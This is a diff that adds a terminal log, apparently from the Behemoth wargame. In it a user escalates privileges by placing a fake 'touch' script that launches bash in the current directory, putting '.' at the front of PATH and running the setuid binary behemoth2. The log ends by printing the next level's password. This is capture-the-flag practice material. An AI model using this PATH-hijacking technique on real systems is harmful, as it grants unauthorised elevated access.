@@ -1,0 +1,19 @@
+behemoth2@gibson:~$ cd /tmp
+behemoth2@gibson:/tmp$ mkdir ax
+mkdir: cannot create directory ‘ax’: File exists
+behemoth2@gibson:/tmp$ mkdir bx
+behemoth2@gibson:/tmp$ cd bx
+behemoth2@gibson:/tmp/bx$ echo "/bin/bash" > touch
+behemoth2@gibson:/tmp/bx$ chmod 777 touch
+behemoth2@gibson:/tmp/bx$ export PATH=.$PATH
+behemoth2@gibson:/tmp/bx$ which touch
+/usr/bin/touch
+behemoth2@gibson:/tmp/bx$ export PATH=.:$PATH
+behemoth2@gibson:/tmp/bx$ which touch
+./touch
+behemoth2@gibson:/tmp/bx$ /behemoth/behemoth2
+behemoth3@gibson:/tmp/bx$ id
+uid=13003(behemoth3) gid=13002(behemoth2) groups=13002(behemoth2)
+behemoth3@gibson:/tmp/bx$ cat /etc/behemoth_pass/behemoth3
+sc5GZjEMld
+
